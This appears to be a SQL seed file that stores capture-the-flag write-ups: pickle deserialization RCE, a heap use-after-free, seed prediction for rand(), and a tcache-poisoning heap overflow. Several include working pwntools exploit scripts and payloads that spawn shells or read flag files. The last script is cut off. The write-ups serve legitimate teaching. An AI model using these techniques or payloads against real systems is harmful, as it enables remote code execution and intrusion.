os\nclass Exploit:\n    def __reduce__():\n        return os.system, ("ls",)\n    \npic = pickle.dumps(Exploit())\n```\n\nIf `pickle.loads(pic)` is executed in another python environment, even without `import os`, the `ls` command would still be run.\n\n## Getting the flag\n\nHowever, even once we get RCE, it\'s still not game over yet. If we used the exploit from above, the server returns a `Internal Server Error` instead of listing any files. This is probably because the server does something like\n\n```python\ndata = pickle.loads(cookie)\nbalance = data["balance"]\n```\n\nBecause `os.system("ls")` returns `0`, and `0` is not a dictionary, the process crashes. During the CTF, I tried several different ways of exfiltrating the flag from the server, such as reverse shell and HTTP requests but none were successful :<.\n\nThe challenge authors may have decided to make it harder by blocking all network connections out of the service^. Anyway, we can still transfer data out through the service itself.\n\n```python\nclass Exploit:\n    def __reduce__():\n        return eval, (\'{"balance":1+1}\',)\n    \npic = pickle.dumps(Exploit())\n```\n\nIn Python (and several other languages), `eval` executes the string it is passed as Python code. In this case, `pickle.loads` returns `{"balance": 2}`. This is displayed to us as the number of credits left after a transaction. Since we can control how `balance` is computed, we can try to use this to encode the flag. But how do we encode a string as an integer? There are many ways of varying complexity, but one of the simplest and most straightforward is to concatenate the binary ASCII values of each character together and parse it as a single integer. Here\'s some code for doing that:\n\n```python\ndef bytes_to_int(b):\n    return int("".join([bin(x)[2:].zfill(8) for x in b]),2)\n\ndef int_to_bytes(inp):\n    # Higher order bit of ASCII is zero\n    bstr = "0" + bin(inp)[2:]\n    chunks = [int(bstr[i:i+8], 2) for i in range(0, len(bstr), 8)]\n    return "".join([chr(x) for x in chunks])\n```\n\nThe final payload:\n\n```python\nclass Exploit:\n    def __reduce__(self):\n        return eval, (\'{"balance": int("".join([bin(x)[2:].zfill(8) for x in open("/app/flag.txt", "rb").read()]), 2)}\',)\n\n\npic = pickle.dumps(Exploit())\nsession.cookies.set(\'zero_mart_data\', make_cookie(pic), domain="aiodmb3uswokssp2pp7eum8qwcsdf52r.ctf.sg")\n\nr = session.post(ENDPOINTS[\'buy\'], json={\'item\': "Chipusuketo"})\nbalance = r.json()[\'balance\'] + 1\nprint(int_to_bytes(balance))\n# => Cyberthon{1r0n1c_h0w_z3r0_m4rt_h45_4_z3r0_d4y}\n```\n\nWhile I didn\'t solve this challenge within the CTF, it\'s still an interesting challenge that required me to think out of the box.\n\n^ Network connections out of the service weren\'t actually blocked. I probably just had a problem getting a reverse shell to work.');
insert into writeup (challenge_id, poster_username, is_private)
values (11, 'jro', 0);
insert into internal_writeup (internal_writeup_id, body)
values ((select max(writeup_id) from writeup),
        '# Coffee shop\n\nCategory: Pwn\n\n13 solves, 486 points\n\n> Userspace heap feng shui is too complicated. Here is a peak into kernel heap exploitation. Use your instincts. \n\nDespite the challenge description being somewhat scary, there is no need to know anything about kernel exploitation to solve this challenge. It really is a very simple heap UAF vulnerability.\n\n## Analysis\n\nWhen the binary is run, we are presented with a menu. We can buy several items, create, edit, delete and view complaints, or speak to the manager. This complaints functionality is the most interesting.\n\nBy filing a complaint, we can malloc an arbitrarily sized chunk on the heap. A pointer to this chunk is stored in an array. \n\nWhen a complaint is reverted, the chunk is freed, but the pointer to it is not zeroed out. This is a use after free vulnerability.\n\n```c\nvoid revert_complaint(){\n  int index;\n\n  index = get_index();\n  if ( index != -1 )\n    free((void *)complaints[index]);\n}\n```\n\nSince we are able to read freed chunks, it is possible to leak the libc base by reading the metadata of a unsort bin chunk.\n\n~~Additionally, as we can edit complaints, it is possible to modify the pointers stored in the freed chunk that are used to manage memory allocation. In this exploit, we will deal with the tcache. Tcache freed chunks have the following structure:~~\n\n```c\ntypedef struct tcache_entry\n{\n  struct tcache_entry *next;  // the next tcache block\n  /* This field exists to detect double frees.  */\n  struct tcache_perthread_struct *key;  // newly pointer in struct\n} tcache_entry;\n```\n\n~~By writing an arbitrary memory location to the `next` pointer, we can trick malloc into returning an arbitrary pointer, allowing us to achieve arbitrary writes and thus RCE.~~\n\nEDIT: Actually, we don\'t even need to do that. We can just allocate and free a suitably size chunk and malloc will return that. We don\'t need to write to anywhere outside the heap in this exploit.\n\nBut where should we write to? Let\'s look at the `get_manager` function. \n\n```c\nif ( !manager )\n    manager = (__int64)malloc(0x10uLL);\n```\n\nFirst, 16 bytes are allocated using malloc. This stores the manager metadata. Next, a menu is printed. Interestingly, if the user enters option 1, a function pointer is called!\n\n```c\nif ( v1 == 1 ){\n    printf("What\'s price of your item?: ");\n    __isoc99_scanf("%lu", &v2);\n    (*(void (__fastcall **)(__int64))(manager + 8))(v2);\n}\n```\n\nSince `manager` is allocated using malloc, we could get malloc to return a pointer to a chunk we control, like one of the complaints. This would allow us to manipulate the function pointer, setting it to something like `system`, then calling it with `"/bin/sh"` , thus obtaining a shell.\n\n### The plan\n\nStage 1: Leak libc base (we\'ll need to find `system` address)\n\n1. Allocate a large chunk (>1032 bytes so that it goes to unsort bin)\n1. Allocate a smaller chunk of size 20 (prevents the large chunk merging into the top chunk). We\'ll call this chunk X\n1. Free the first chunk\n1. Read chunk X\n1. Compute offset from libc base\n1. Subtract offset to get libc base\n\nIn my case, I found the offset was `0x1ebbe0`.\n\nStage 2: Writing manager function pointer\n\n1. Allocate a small chunk to act as a stopper to prevent chunk X from being merged with the top chunk\n2. Free chunk X\n3. Call the `get_manager` function, with option 2 (essentially a no-op). This calls malloc, which returns chunk X.\n4. Write chunk X to "AAAAAAAA" + system address\n5. Call `get_manager` with option 1. For the item price, we can enter the address of `/bin/sh`. This will allow us to obtain a shell when the function pointer is called.\n\n\n\n## Exploit \n\n```python\n\nfrom pwn import *\n\nld = ELF("./ld-2.31.so", checksec=False)\nlibc = ELF("./libc-2.31.so", checksec=False)\n\ndef edit(index: int, data: bytes|str):\n    p.recvuntil(\'>\')\n    p.sendline(\'6\')\n    p.recvuntil(\'Please enter your complaint\'s ID:\')\n    p.sendline(str(index))\n    p.recvuntil(\'Write your complaint (again):\')\n    p.sendline(data)\n\ndef malloc(length: int, data: bytes|str):\n    p.recvuntil(\'>\')\n    p.sendline(\'4\')\n    p.recvuntil(\'How many characters does your complaint contain:\')\n    p.sendline(str(length))\n    p.recvuntil(\'Write your complaint:\')\n    p.sendline(data)\n\n\ndef free(index: int):\n    p.recvuntil(\'>\')\n    p.sendline(\'5\')\n    p.recvuntil(\'Please enter your complaint\'s ID:\')\n    p.sendline(str(index))\n\n\ndef read(index: int):\n    p.recvuntil(\'>\')\n    p.sendline(\'7\')\n    p.recvuntil(\'Please enter your complaint\'s ID:\')\n    p.sendline(str(index))\n\n\ne = ELF("./coffee_shop")\ncontext.binary = e\n\ndef setup():\n    #p = process([ld.path, e.path], env={"LD_PRELOAD": libc.path})\n    p = remote("coffee-shop.chal.idek.team", 1337)\n    return p\n\n\nif __name__ == \'__main__\':\n    p = setup()\n\n    malloc(1279,b"a"*10)\n    malloc(20,b"a"*10)\n    free(0)\n    read(0)\n    leak = p.recvline()[1:-1]\n    leak = u64(leak+b"\0\0")\n    libc.address = leak-0x1ebbe0\n    malloc(20,b"a"*10)\n    free(1)\n    p.sendline("8")\n    p.sendline("2")\n    edit(1,b"A"*8+p64(libc.sym.system))\n    sh = next(libc.search(b"/bin/sh"))\n    p.sendline("8")\n    p.sendline("1")\n    p.sendline(str(sh))\n    \n    p.interactive()\n\n```');
insert into writeup (challenge_id, poster_username, is_private)
values (12, 'jro', 0);
insert into internal_writeup (internal_writeup_id, body)
values ((select max(writeup_id) from writeup),
        '# Badseed\n\nCategory: Kiddy pool\n\nIn this challenge, we are given a 64 bit linux binary.\n\n```sh\n$ file badseed       \nbadseed: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=d1923d37cdc7c798e5d6294b0dca49ba75519fc9, for GNU/Linux 3.2.0, not stripped\n```\n\nTypically, linux binaries can appear in two different categories of challenges: pwn and reversing. In either case, the next course of action is to decompile the binary.\n\nWhen a C program is compiled using `gcc` or any other compiler, source code is parsed and transformed into assembly instructions. These instructions are then encoded and packed together, along with some headers and metadata, to give you a compiled binary that your operating system can run.\n\nDecompilation is the reverse process: we use special software to recover much of the source code from the binary file. Although the decompilation is not perfect, it allows us to get a better idea of what the binary is doing.\n\nTo decompile a C binary, you can use [ghidra](https://ghidra-sre.org/) (which is free and open source) or [IDA](https://hex-rays.com/ida-pro/) (which costs a ton of money). I\'ll be using ghidra, as it\'s much more accessible to a beginner. \n\n## Analysis\n\nOnce you\'ve launched ghidra, you\'ll probably see an empty project. Drag the binary into the project window and double click it.\n\nWhen the binary opens up, you will see the following message:\n\n> badseed has not been analyzed. Would you like to analyze it now?\n\nClick `Yes` and then click `Analyze`.\n\nType `main` into the filter in the `Symbol Tree` window and double click `main`.  The main function contains the code that will be run when the program starts.\n\nYou should see the following code pop up in a pane to the right:\n\n```c\nundefined8 main(EVP_PKEY_CTX *param_1)\n\n{\n  init(param_1);\n  question_one();\n  question_two();\n  question_three();\n  gz();\n  return 0;\n}\n```\n\nFrom this decompilation, we can see that `main` calls an `init` function, three question functions and finally `gz`. We can now double click any of these functions to view their decompilation. I will skip the `init` function as it isn\'t very interesting.\n\n### `question_one`\n\n```c\nvoid question_one(void)\n\n{\n  long in_FS_OFFSET;\n  double dVar1;\n  int local_24;\n  float local_20;\n  int local_1c;\n  int local_18;\n  int local_14;\n  long local_10;\n  \n  local_10 = *(long *)(in_FS_OFFSET + 0x28);\n  local_20 = 6.035077;\n  local_1c = 4000;\n  local_24 = 0;\n  local_18 = 0;\n  dVar1 = floor(6.035077095031738);\n  local_14 = (int)dVar1;\n  local_18 = (int)((float)local_1c / local_20);\n  puts("how heavy is an asian elephant on the moon?");\n  __isoc99_scanf(&DAT_00402034,&local_24);\n  if (local_18 != local_24) {\n    puts("wrong bye bye");\n                    /* WARNING: Subroutine does not return */\n    exit(0);\n  }\n  puts("\ngreat 2nd question:");\n  puts("give me the rand() value");\n  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {\n                    /* WARNING: Subroutine does not return */\n    __stack_chk_fail();\n  }\n  return;\n}\n```\n\nWhen we\'re analyzing programs, one of the first things to look out for are\n\n1. How is the program getting its inputs?\n2. What decisions is the program making?\n\nIn this function, `scanf` is called with format specifier `%d` (you can click on `DAT_00402034` to see that it points to `%d`) and the result is read into `local_24`. So the program expects an integer as input and stores it into `local_24`. Next, it compares `local_18` against `local_24`. If the two are not equal, the program exits (which is almost definitely a bad thing), but if they are equal, the program moves on to the second question (a good thing).\n\nNow, we can move on to look at the value of `local_18`.  I\'ve grabbed a few lines of code relevant to its computation:\n\n```c\nlocal_20 = 6.035077;\nlocal_1c = 4000;\n// Other code\nlocal_18 = (int)((float)local_1c / local_20)\n```\n\nOk that doesn\'t seem that complicated: it\'s just division of two numbers. Using python or a calculator, you will find that `floor(4000/6.035077)=662`. So if we enter 662, we can get to the next question!\n\n### `question_two`\n\n```c\nvoid question_two(void)\n\n{\n  long in_FS_OFFSET;\n  int local_24;\n  int local_20;\n  int local_1c;\n  time_t local_18;\n  long local_10;\n  \n  local_10 = *(long *)(in_FS_OFFSET + 0x28);\n  local_18 = time((time_t *)0x0);\n  __isoc99_scanf(&DAT_00402034,&local_24);\n  srand((uint)local_18);\n  local_20 = rand();\n  local_1c = rand();\n  if (local_1c != local_24) {\n    puts("wrong bye bye");\n                    /* WARNING: Subroutine does not return */\n    exit(0);\n  }\n  puts("great 3rd question:");\n  puts("no hint this time... you can do it?!");\n  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {\n                    /* WARNING: Subroutine does not return */\n    __stack_chk_fail();\n  }\n  return;\n}\n```\n\nIn this challenge the input is also an integer, as we see the `scanf` into `local_24` again. `local_24` is compared against `local_1c`, which is the return value of the `rand` function. Searching "rand function C" on google, we find that [the `rand` function returns a pseudo-random number](https://www.tutorialspoint.com/c_standard_library/c_function_rand.htm). Wait, random number? How do we predict that?\n\nScrolling down a bit, there\'s an example usage of the `rand` function:\n\n```c\n/* Intializes random number generator */\nsrand((unsigned) time(&t));\n\n/* Print 5 random numbers from 0 to 49 */\nfor( i = 0 ; i < n ; i++ ) {\n	printf("%d\n", rand() % 50);\n}\n```\n\nHmm, the `srand` and `time` functions are called in our binary too! The [`srand` function sets the RNG\'s seed](https://www.tutorialspoint.com/c_standard_library/c_function_srand.htm) and the [`time` function returns the current time](https://www.geeksforgeeks.org/time-function-in-c/). Since the return value of the `time` function is passed to the `srand` function, the RNG seed is actually the current time, which we can predict!\n\nThe only problem is, we\'d have to generate a random number and type it in at exact moment of time when the program is run, which is almost impossible. Luckily, we can use an amazing library called [pwntools](https://docs.pwntools.com/) to automate this process with the precision of a machine. Pwntools is incredibly useful for a huge range of things, from binary exploitation, to reversing and even solving interactive crypto challenges.\n\nTo generate random numbers, I made this small C program that replicates what the binary is doing:\n\n```c\n#include <stdio.h>\n#include <stdlib.h>\nint main(){\n    srand(time(NULL));\n    int x = rand();\n    int y = rand();\n    printf("%d\n",y);\n    return 0;\n}\n```\n\nNote that the binary calls `rand` twice, but only uses the second one. I compiled the C program into a binary called `random`.\n\nNow, we can write some python code to automate solving question 2:\n\n```python\n# Import all functions from pwntools\nfrom pwn import *\n\n# Start the challenge binary as a process\n# By storing it in a variable, we can send inputs to it and receive its output\np = process("./badseed")\n\n# Uncomment this line to send inputs to the challenge server instead \n# p = remote("ctf.k3rn3l4rmy.com", 2200)\n\n# We use the sendline function to send input to the process\n# This is the value from question 1\np.sendline("662")\n# We then start our random number generator process\nr = process("./random")\n# And read its output to obtain the random number\n# Remember to use the int function, as the output is returned as a string\nx = int(r.recvline())\n# Send the predicted random number to the challenge process\np.sendline(str(x))\n# We use the interactive function to allow us to interact with the process\n# through the terminal, instead of through pwntools\np.interactive()\n```\n\nYou will need to install pwntools to run this code. \n\nYou should see this output:\n\n```sh\n$ python3 badseed.py\n[+] Starting local process \'./badseed\': pid 2879\n[+] Starting local process \'./random\': pid 2881\n[*] Process \'./random\' stopped with exit code 0 (pid 2881)\n[*] Switching to interactive mode\nhow heavy is an asian elephant on the moon?\n\ngreat 2nd question:\ngive me the rand() value\ngreat 3rd question:\nno hint this time... you can do it?!\n$  \n```\n\n### `question_three`\n\n```c\nvoid question_three(void)\n\n{\n  long in_FS_OFFSET;\n  int local_2c;\n  uint local_28;\n  int local_24;\n  int local_20;\n  int local_1c;\n  time_t local_18;\n  long local_10;\n  \n  local_10 = *(long *)(in_FS_OFFSET + 0x28);\n  local_18 = time((time_t *)0x0);\n  srand((uint)local_18);\n  local_28 = rand();\n  srand(local_28);\n  local_24 = rand();\n  local_20 = (int)local_28 / local_24;\n  local_1c = local_20 % 1000;\n  __isoc99_scanf(&DAT_00402034,&local_2c);\n  if (local_1c != local_2c) {\n    puts("wrong bye bye");\n                    /* WARNING: Subroutine does not return */\n    exit(0);\n  }\n  puts("great heres your shell");\n  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {\n                    /* WARNING: Subroutine does not return */\n    __stack_chk_fail();\n  }\n  return;\n}\n```\n\nIn this part, we see `rand`, `srand` and `time` again. Interestingly, `srand` is called twice, once with the current time, and again with the first output of `rand`. The final output is the ratio of the first `rand` output to the second, modulo 1000. It\'s no big deal, and we\'ll use the same technique from the previous part, accounting for these new tweaks.\n\nI wrote a new C program:\n\n```c\n#include <stdio.h>\n#include <stdlib.h>\nint main(){\n    srand(time(NULL));\n    int x = rand();\n    srand(x);\n    int y = rand();\n    printf("%d\n",(x/y)%1000);\n    return 0;\n}\n```\n\nand compiled it into `random2`.\n\nNext, I copied the python code for part 2 and changed the process name, giving me this script:\n\n```python\n# Import all functions from pwntools\nfrom pwn import *\n\n# Start the challenge binary as a process\n# By storing it in a variable, we can send inputs to it and receive its output\np = process("./badseed")\n\n# Uncomment this line to send inputs to the challenge server instead \n# p = remote("ctf.k3rn3l4rmy.com", 2200)\n\n# We use the sendline function to send input to the process\n# This is the value from question 1\np.sendline("662")\n\n# We then start our random number generator process\nr = process("./random")\n# And read its output to obtain the random number\n# Remember to use the int function, as the output is returned as a string\nx = int(r.recvline())\n# Send the predicted random number to the challenge process\np.sendline(str(x))\n\n# Basically the same as part 2, with a different process name\nr = process("./random2")\nx = int(r.recvline())\np.sendline(str(x))\n\n# We use the interactive function to allow us to interact with the process\n# through the terminal, instead of through pwntools\np.interactive()\n```\n\nAnd when we run the script again, we get our shell:\n\n```sh\n$ python3 badseed.py\n[+] Starting local process \'./badseed\': pid 3047\n[+] Starting local process \'./random\': pid 3049\n[*] Process \'./random\' stopped with exit code 0 (pid 3049)\n[+] Starting local process \'./random2\': pid 3051\n[*] Process \'./random2\' stopped with exit code 0 (pid 3051)\n[*] Switching to interactive mode\nhow heavy is an asian elephant on the moon?\n\ngreat 2nd question:\ngive me the rand() value\ngreat 3rd question:\nno hint this time... you can do it?!\ngreat heres your shell\n$ whoami\nkali\n$  \n```\n\nYay!\n\nAll that\'s left is to uncomment the 9th line to run the script on the challenge server instead of our local binary. If this script doesn\'t work on the challenge server, your system clocks might be out of sync. You can try using NTP to sync your clocks. Or the admins might have taken the challenge server down.\n\n\n\n## Flag\n\n> flag{i_0_w1th_pwn70ols_i5_3a5y}\n\nIndeed it is');
insert into writeup (challenge_id, poster_username, is_private)
values (13, 'jro', 0);
insert into internal_writeup (internal_writeup_id, body)
values ((select max(writeup_id) from writeup),
        '# Gradebook\n\nCategory: pwn\n\n454 Points (24 solves)\n\n> My teachers been using a commandline gradebook made by a first year student, must be vulnerable somehow.\n>\n> `nc ctf.k3rn3l4rmy.com 2250`\n\nTwo files are provided, a Linux 64-bit executable and a libc shared object file. First, let\'s look at the security protections on the executable:\n\n```\n  checksec gradebook  \n    Arch:     amd64-64-little\n    RELRO:    Full RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      PIE enabled\n```\n\nOh wow, everything is enabled!\n\nNext, I used IDA to decompile the binary. The main function features a menu, where the user can choose to run several operations:\n\n1. Add student\n2. List students\n3. Update grade\n4. Update name\n5. Close gradebook\n\nAt this point, given all the stack protections applied to the binary and the presence of a menu, I guessed that this was going to be a heap challenge. This was going to be fun, but challenging as it\'s the first time I\'ve solved a heap challenge in a CTF.\n\nAnyway, let\'s get on with analyzing each function.\n\n## Static analysis\n\nLet\'s start with `add_student`:\n\n<img src="images/image-20211114154956512.png" alt="image-20211114154956512" style="zoom:80%;" />\n\nFirst, a block of memory 24 bytes long is allocated on the heap (line 9). This will be used to store metadata about the student. Next, we are prompted for a student ID (line 11 and 12) and the lookup function checks that the student ID was not previously assigned. This has a maximum length of 8 characters and there doesn\'t appear to be any buffer overflow here. Next, we are prompted for the length of the student\'s name (line 17 and 18) and a buffer of equal size is allocated on the heap (line 19). This size is stored into `[s+12]`. \n\nWe can then write data into this buffer. Again, it appears there is no buffer overflow as there is adequate bounds checking. One note is `read` does not null terminate its output, so it could allow us to read stuff that\'s immediately after the string. Finally, a pointer to this buffer is stored into the metadata buffer and a pointer to the metadata buffer is stored into the global students array. \n\nAt this point, we should note that the maximum number of students we can create is 9, due to a check in the main function. But it\'s not really important as we\'ll be creating much fewer than 9 students.\n\nWhile this function is not very interesting as it\'s not very vulnerable, it\'s the core of this application. \n\nLet\'s move on to the `update_grade` function. This is where it gets more interesting:\n\n<img src="images/image-20211114155853882.png" alt="image-20211114155853882" style="zoom:80%;" />\n\nWe are prompted for a student ID. If this ID is valid, we are prompted for a number, which is supposed to be between 0 and 100. But is it really? Let\'s look at the check involved. Firstly, the format specifier used in line 20 is `%ld` instead of `%d` as we would usually expect for integers. In fact, `%ld` is the format specifier for longs, which are usually 64 bits (or 8 bytes or 4 words) long, while integers are usually 32 bits (4 bytes or 2 words) long. \n\nSuppose the grade I enter is `0xaaaaaaaabbbbbbbb` (there are 8 `a`s and 8`b`s, which make up 64 bits in total). Since the binary is little-endian, this number is stored in memory as `bb bb bb bb aa aa aa aa`. In line 20, the memory at `[s+8]` is compared as an int, which is only 4 bytes. Thus, only the less significant 32 bits (`0xbbbbbbbb`) will be read and compared. Since this is much larger than 100, the else block is executed, which supposedly sets the grade to `-1`. However, it only operates on a `DWORD` (double word ie 4 bytes) of memory. This leaves the `aa aa aa aa` untouched. In the end, the memory at `[s+8]` will look like `ff ff ff ff aa aa aa aa`. \n\nWell, clearly something unexpected is happening here: we\'re writing 8 bytes, when we should only be writing 4 bytes. Where do the other 4 bytes end up? If we look back to the `add_student` function above, `[s+12]` is actually where the size of the student\'s name buffer is stored. This is very important, as meddling with the size could allow us to perform a buffer overflow and write arbitrary data. \n\nIn fact, the next function, `update_name` allows us to do just this:\n\n<img src="images/image-20211114162211136.png" alt="image-20211114162211136" style="zoom:80%;" />\n\nIn line 19, `read` is used to write data into the student\'s name buffer, except this time the size (param 3) is read from `[s+12]`, which we now control. As the buffer is not resized, we can achieve a buffer overflow!\n\nThe remaining functions, `close_gradebook` and `list_students` are not particularly interesting.  `close_gradebook` frees all the metadata and student name buffers and sets references to them to null, so there\'s not double free vulnerability here. `list_students` prints out the name and ID of the students.\n\n## Dynamic analysis\n\nWith a bit better understanding of the binary, we can move on to running and debugging the binary. However, since the binary comes with its own libc, things are not quite so straightforward. \n\nFirst, we need to patch the binary and download a relevant linker with [`pwninit`](https://github.com/io12/pwninit). This will make sure that we are running the binary with the provided libc instead of the default on our machines. It also helpfully generates a simple solve script.\n\nWith that out of the way, we can debug the binary with `gdb`. I used gdb with gef, as it comes with great tools for inspecting the heap as well as support for PIE breakpoints. We\'ll need to make sure gdb knows which libc to use, which we can set with the `LD_PRELOAD` environment variable. The command I used to start gdb is:\n\n```shell\ngdb -iex "set exec-wrapper env LD_PRELOAD=$(pwd)/libc.so.6" ./gradebook\n```\n\nOk, now we can finally get down to debugging. We set a PIE breakpoint at `0x1912` (the `scanf` in the main function) and run the binary. It\'s important that we use `pie break` and not `break` as the address we want to break on isn\'t actually known until runtime.\n\n```\npie break *0x1912\npie run\n```\n\nOnce we hit the breakpoint, we continue and create a student by entering `1` on the menu. Let\'s set the student ID as `a1` and use 20 bytes for the student\'s name, which we\'ll set as "aaaaaa".\n\nWe should hit the breakpoint again. Let\'s use `heap chunks` to inspect the heap:\n\n![image-20211114163637882](images/image-20211114163637882.png)\n\nAside from the `aaaaaa` and `a1` that we entered, we see the size `20 = 0x14` (red arrow) next to the `ff ff ff ff`, which is `-1` in 2\'s complement, which is the current grade. We also note that the student\'s name is not null terminated (green arrow). Well you can\'t see it as it\'s all null bytes, but it is null terminated.\n\nLet\'s try editing the grade next. We\'ll edit `a1`\'s grade and enter 806022195882, which is the decimal representation of `0xbbaaaaaaaa`. Note that we actually trigger the else block, since the error message is printed:\n\n<img src="images/image-20211114164614954.png" alt="image-20211114164614954" style="zoom:80%;" />\n\nAfter we hit the breakpoint, run `heap chunks` again to inspect the heap.\n\n<img src="images/image-20211114164656428.png" alt="image-20211114164656428" style="zoom:80%;" />\n\nThe `0x14` we saw in the previous heap dump, is replaced by `0xbb`, as expected. (If this confuses you, remember things are little endian, so the `bb` represents the most significant byte). This is a huge win for us as we\'ve tricked the binary into thinking the size is `0xbb = 187`, when only `0x14 = 20` bytes are allocated. This means we can overflow the buffer by 167 bytes. Hooray!\n\nLet\'s test this out by screwing up the memory. Update the student\'s name with a really long string and dump the heap again:\n\n<img src="images/image-20211114165151912.png" alt="image-20211114165151912" style="zoom:80%;" />\n\nAs you can see, we\'ve completely screwed up the next chunk in the heap by overwriting its metadata, which includes its size. This chunk happens to be the top chunk, which you could use for more complicated heap attacks, but we\'re not going to do that in this challenge.\n\n\n\n## Exploit development\n\nOk, so now we kinda know how the binary works, and we\'ve validated parts of our attack, including the crucial heap buffer overflow.\n\nHere\'s a rough, high level overview of what we\'ll do in this section:\n\n1. Leak libc base\n2. Get `malloc` to return a chunk at `__malloc_hook`\n3. Write a one gadget to that malloc hook\n4. Allocate a chunk\n5. Get shell\n\nStep 1 and 2 are much harder than they seem and are the main points of this exploit. \n\nIf you\'ve done heap exploitation before, you\'re probably really used to this. \n\nIf you haven\'t done any heap challenges before, you should watch [this video](https://youtu.be/43ewpRBIRgA?t=1191) that explains the heap pretty well, especially what happens after freeing heap memory (specifically for the tcache). \n\nThe first step is to leak the libc address. This is really important because ASLR is probably enabled and since `__malloc_hook` is in libc, we need to know exactly where it is in order to write to it.\n\nTo do this, I created two students, longname, with name buffer size 1250, and shortname, with name buffer size 20.\n\n<img src="images/image-20211114170836188.png" alt="image-20211114170836188" style="zoom:80%;" />\n\nI\'ve given them student IDs a1 and a2 respectively. Now I\'ll free both of them.\n\nNext, I run `heap bins` to find out where the freed memory went.\n\n<img src="images/image-20211114171005063.png" alt="image-20211114171005063" style="zoom:80%;" />\n\nAs expected, all of the small chunks went to the tcache, but the large chunk went to an unsorted bin. This is expected as the tcache has a maximum chunk size of 1032 bytes.\n\nLet\'s run `heap chunks` to see what has become of the data:\n\n<img src="images/image-20211114171329429.png" alt="image-20211114171329429" style="zoom:80%;" />\n\nThe smaller chunks\' data is replaced by forward pointers, which are part of the tcache structure. The tcache is basically a linked list of freed blocks, and when a small amount memory is allocated, the tcache is accessed to find a suitable block.\n\nWhat\'s interesting is the large block at address `0x5555555592c0`. Instead of heap addresses, they look like much higher stack addresses. I\'m not too familiar with how unsorted bins are organized, but luckily for me, this addresses has a constant offset of +`0x1ebbe0` or +2014176 from the libc base address. \n\nTo read this data, we reallocate student a1, with name size 1250 and write 7 characters + newline as the name. `malloc` will return the same chunk, which contains the address we want to read. Since `read` is not null terminated, when the name of the student is read, the address will be read along with it too. \n\n<img src="images/image-20211114172602051.png" alt="image-20211114172602051" style="zoom:80%;" />\n\nYou can see that the name `abcdefg` is right up against the address we want to read, with a newline character separating the two. When the students are listed, this address will be leaked.\n\n<img src="images/image-20211114172717680.png" alt="image-20211114172717680" style="zoom:80%;" />\n\nFrom here\'s its trivial to use pwntools to extract and decode this address. However, we must remember to append two null bytes before decoding as only 6 bytes of the 8 byte address are actually set, and the address is printed in little endian.\n\nOk, so we\'ve gotten our libc leak. Half the battle is won!\n\nNext, we will use the heap overflow that we explored earlier to screw up the tcache structure and get malloc to return a pointer to `__malloc_hook`. \n\nFirst, we edit the grade of `a1` so that we can write beyond the 1250 bytes that we\'ve been allocated. I used `0xbbbbaaaaaaaa = 206414696589994`, which gives us `0xbbbb = 48059` bytes to play with, which is much much more than sufficient.\n\nHere\'s the heap after we\'ve overwritten the size of the name buffer:\n\n![image-20211114173727820](images/image-20211114173727820.png)\n\nThe size has been changed from `0x04e2 = 1250` (remember little endian) to `0xbbbb = 48059`. \n\nI\'ve also run `heap bins` to look at the tcache. As I\'ve mentioned earlier, the tcache is a linked list of freed memory blocks. The pointers to the next block in the linked list are stored in the block itself. The exact structure of the tcache varies by libc version (we\'re using 2.31), and [from libc 2.29 to 2.31, it looks like this](https://chowdera.com/2020/11/20201127020131284a.html):\n\n```c\ntypedef struct tcache_entry\n{\n  struct tcache_entry *next;  // the next tcache block\n  /* This field exists to detect double frees.  */\n  struct tcache_perthread_struct *key;  // newly pointer in struct\n} tcache_entry;\n```\n\nThe tcache starts at `0x00005555555597d0` with `next` pointing to `0x5555555592a0` (green arrow). `0x5555555592a0` is itself a tcache block, but its `next` pointer is null. This signals the end of the tcache. When memory blocks of size `20` are allocated, the block at `0x00005555555597d0` will be used first. Then, the value at the `next` pointer will be stored in the stack and set as the start of the tcache. This process repeats until the tcache is empty. In our case, the first allocation is used to store student metadata, while the second allocation stores the student name, which we can write to.\n\nBy using our heap overflow, we can overwrite the `next` pointer of  `0x00005555555597d0`. Thus, when `0x00005555555597d0` is allocated, the start of the tcache will become whatever address we wrote. Then, when the next block is allocated, `malloc` will return a pointer to the address we wrote, since we\'ve tricked it into thinking that\'s part of the tcache. We can then write arbitrary data into this address.\n\nLet\'s see this attack in action. The name buffer of a1 starts at `0x00005555555592c0`, and the next pointer we want to write is at `0x00005555555597d0`. It seems that the offset is 1296 bytes. However, there is a header containing metadata about the chunk size that starts 8 bytes before the data. Therefore, the offset is actually 1288. The metadata is `0x21`, which consists of the chunk length (32 = 0x20), with the least significant bit set as a flag (`PREV_INUSE`).\n\n\n\nHere\'s what I got after running the attack:\n\n![image-20211114181634544](images/image-20211114181634544.png)\n\n`heap chunks` is really screwed up as we\'ve overwritten the metadata of one of the chunks with As, but the tcache linked list shows us what we want to see. At the head is `0x5555568e37d0`, which points to `0x7f1aba80fb70`, which is the `__malloc_hook` address!\n\n<img src="images/image-20211114181848776.png" alt="image-20211114181848776" style="zoom:80%;" />\n\nWhenever `malloc` is called, if `__malloc_hook` is not null, it will be treated as a function pointer and the function at the address it points to will be called. I used [`one_gadget`](https://github.com/david942j/one_gadget) to find a suitable one gadget to jump to. Fortunately, `0xe6c81` worked and I got a shell!\n\n<img src="images/image-20211114183252262.png" alt="image-20211114183252262" style="zoom:80%;" />\n\n## Script\n\n```python\n#!/usr/bin/env python3\n\nfrom pwn import *\n\nexe = ELF("./gradebook")\nlibc = ELF("./libc.so.6")\nld = ELF("./ld-2.31.so")\n\ncontext.binary = exe\n\n\ndef conn():\n    if args.LOCAL:\n        return process([ld.path, exe.path], env={"LD_PRELOAD": libc.path})\n    else:\n        return remote("ctf.k3rn3l4rmy.com", 2250)\n\ndef main():\n    r = conn()\n    r.sendline("1")\n    r.sendline("a1")\n    r.sendline("1250")\n    r.sendline("a"*20)\n    r.recvuntil("Exit Gradebook")\n    r.sendline("1")\n    r.sendline("a2")\n    r.sendline("10")\n    r.sendline("hi")\n    r.recvuntil("Exit Gradebook")\n    # I encountered a bit of a race condition, which is weird\n    time.sleep(1)\n    r.sendline("5")\n    r.recvuntil("Exit Gradebook")\n    r.sendline("1")\n    r.sendline("b1")\n    r.sendline("1250")\n    r.sendline("a"*7)\n    r.recvuntil("Exit Gradebook")\n    r.sendline("2")\n    